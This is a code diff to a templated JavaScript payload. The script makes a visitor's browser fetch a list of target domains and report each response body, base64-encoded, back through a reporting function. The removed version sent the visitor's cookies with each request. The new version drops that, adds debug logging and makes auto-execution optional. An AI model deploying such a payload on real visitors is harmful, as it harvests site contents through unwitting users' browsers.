@@ -1,38 +1,53 @@
 {% include "./_common.js" %}
 
 const targets = [
-    {% for cur_target in payload_targets %}{% if not forloop.last %}"{{ cur_target.domain }}",
-    {% else %}"{{ cur_target.domain }}"
-    {% endif %}{% endfor %}
+    {% for cur_target in payload_targets %}{% if not forloop.last %}"https://{{ cur_target.domain }}/",
+    {% else %}"https://{{ cur_target.domain }}/"{% endif %}{% endfor %}
 ];
 
 const fetchTarget = (url) => {
     const startTime = performance.now();
-    fetch(url, {
+    return fetch(url, {
         method: "GET",
-        credentials: "include",
+        cache: "no-store",
     }).then((result) => {
-        result.text().then((text) => {
-            reportSuccess(
-                url,
-                btoa(text),
-                performance.now() - startTime
-            ).catch((err) => {
+        emitDebug("Got result for URL ", url);
+        emitDebug(result);
+        result.blob().then((blob) => {
+            emitDebug("Got blob for URL ", url);
+            emitDebug(blob);
+            blob.text().then((text) => {
+                emitDebug("Got text for URL ", url);
+                emitDebug(text);
+                reportSuccess(
+                    url,
+                    btoa(unescape(encodeURIComponent(text))),
+                    performance.now() - startTime,
+                    result.status
+                ).catch((err) => {
+                    reportErr(
+                        url,
+                        "success_report",
+                        err,
+                        performance.now() - startTime
+                    );
+                });
+            }).catch((err) => {
                 reportErr(
                     url,
-                    "success_report",
+                    "text_decoding",
                     err,
                     performance.now() - startTime
                 );
-            });
+            })
         }).catch((err) => {
             reportErr(
                 url,
-                "response_decoding",
+                "blob_decoding",
                 err,
                 performance.now() - startTime
             );
-        });
+        })
     }).catch((err) => {
         reportErr(
             url,
@@ -49,4 +64,6 @@ const fetchAllTargets = () => {
     }
 }
 
+{% if auto_invoke %}
 fetchAllTargets();
+{% endif %}
